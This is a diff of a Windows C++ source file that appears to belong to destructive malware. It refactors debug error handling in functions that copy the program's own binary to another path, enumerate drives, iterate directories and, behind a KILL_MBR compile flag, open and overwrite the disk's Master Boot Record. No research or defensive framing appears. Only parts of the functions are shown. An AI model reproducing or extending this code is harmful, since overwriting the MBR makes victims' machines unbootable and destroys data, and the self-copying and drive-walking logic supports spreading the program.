@@ -10,28 +10,21 @@ BOOL fnCopyFileW(
 		if (CopyFile(szMfn, lpAdfn, FALSE)) {
 			return TRUE;
 		} else {
-#ifdef DEBUG_MSG
-			fnErrorHandlerW(L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", NULL, L"CopyFileW", MB_OK | MB_ICONERROR, szMfn, lpAdfn);
-#endif // DEBUG_MSG
+			fnERRORHANDLERW(L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", NULL, L"CopyFileW", MB_ICONERROR, szMfn, lpAdfn);
 			return FALSE;
 		}
 	} else {
 		if (GetLastError() == ERROR_ALREADY_EXISTS) {
-#ifdef DEBUG_MSG
-			fnErrorHandlerW(L"Directory already exist\nPath: %s", NULL, L"CreateDirectoryW", MB_OK | MB_ICONWARNING, lpAdpn);
-#endif // DEBUG_MSG
+			fnERRORHANDLERW(L"Directory already exist\nPath: %s", NULL, L"CreateDirectoryW", MB_ICONWARNING, lpAdpn);
+
 			if (CopyFile(szMfn, lpAdfn, FALSE)) {
 				return TRUE;
 			} else {
-#ifdef DEBUG_MSG
-				fnErrorHandlerW(L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", NULL, L"CopyFileW", MB_OK | MB_ICONERROR, szMfn, lpAdfn);
-#endif // DEBUG_MSG
+				fnERRORHANDLERW(L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", NULL, L"CopyFileW", MB_ICONERROR, szMfn, lpAdfn);
 				return FALSE;
 			}
 		} else {
-#ifdef DEBUG_MSG
-			fnErrorHandlerW(L"Couldn't create target Directory\nPath: %s", NULL, L"CreateDirectoryW", MB_OK | MB_ICONERROR, lpAdpn);
-#endif // DEBUG_MSG
+			fnERRORHANDLERW(L"Couldn't create target Directory\nPath: %s", NULL, L"CreateDirectoryW", MB_ICONERROR, lpAdpn);
 			return FALSE;
 		}
 	}
@@ -39,6 +32,7 @@ BOOL fnCopyFileW(
 	return FALSE;
 }
 
+// TODO: Fix uninitialized or just change to _Inout_ instead
 BOOL fnDriveEnumeratorW(
 	_Out_ std::vector<std::wstring>* vszDrives
 ) {
@@ -54,19 +48,14 @@ BOOL fnDriveEnumeratorW(
 						vszDrives->push_back(szDrive);
 					}
 				} else {
-#ifdef DEBUG_MSG
-					fnErrorHandlerW(L"Couldn't determin Drive type\nPath: %s", NULL, L"GetDriveTypeW", MB_OK | MB_ICONWARNING, szDrive.c_str());
-#endif // DEBUG_MSG
+					fnERRORHANDLERW(L"Couldn't determin Drive type\nPath: %s", NULL, L"GetDriveTypeW", MB_ICONWARNING, szDrive.c_str());
 				}
 			}
 		}
 
 		return TRUE;
 	} else {
-#ifdef DEBUG_MSG
-		fnErrorHandlerW(L"Couldn't enumerate Drives", NULL, L"GetLogicalDriveStringsW", MB_OK | MB_ICONERROR);
-		MessageBox(NULL, L"Couldn't Enumerate Drives", L"GetLogicalDriveStringsW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
-#endif // DEBUG_MSG
+		fnERRORHANDLERW(L"Couldn't enumerate Drives", NULL, L"GetLogicalDriveStringsW", MB_ICONERROR);
 
 		return FALSE;
 	}
@@ -96,14 +85,12 @@ BOOL fnDirectoryIteratorW(
 		FindClose(hFind);
 		return TRUE;
 	} else {
-#ifdef DEBUG_MSG
-		fnErrorHandlerW(L"Couldn't open Handle \"hFind\" to FirstFile", NULL, L"FindFirstFileW", MB_OK | MB_ICONERROR);
-#endif // DEBUG_MSG
+		fnERRORHANDLERW(L"Couldn't open Handle \"hFind\" to FirstFile", NULL, L"FindFirstFileW", MB_ICONERROR);
 		return FALSE;
 	}
 }
 
-#ifdef KILL_MBR
+#if KILL_MBR == TRUE
 // at somepoint I might implement a custom MBR displaying a message
 BOOL fnOverwriteMBR(VOID) {
 	WCHAR szMbrData[nMBR];
@@ -116,16 +103,12 @@ BOOL fnOverwriteMBR(VOID) {
 			CloseHandle(hMbr);
 			return TRUE;
 		} else {
-#ifdef DEBUG_MSG
-			fnErrorHandlerW(L"Couldn't overwrite MBR", NULL, L"WriteFile", MB_OK | MB_ICONERROR);
-#endif // DEBUG_MSG
+			fnERRORHANDLERW(L"Couldn't overwrite MBR", NULL, L"WriteFile", MB_ICONERROR);
 			CloseHandle(hMbr);
 			return FALSE;
 		}
 	} else {
-#ifdef DEBUG_MSG
-		fnErrorHandlerW(L"Couldn't open Handle \"hMbr\" to MBR", NULL, L"CreateFileW", MB_OK | MB_ICONERROR);
-#endif // DEBUG_MSG
+		fnERRORHANDLERW(L"Couldn't open Handle \"hMbr\" to MBR", NULL, L"CreateFileW", MB_ICONERROR);
 		return FALSE;
 	}
 }
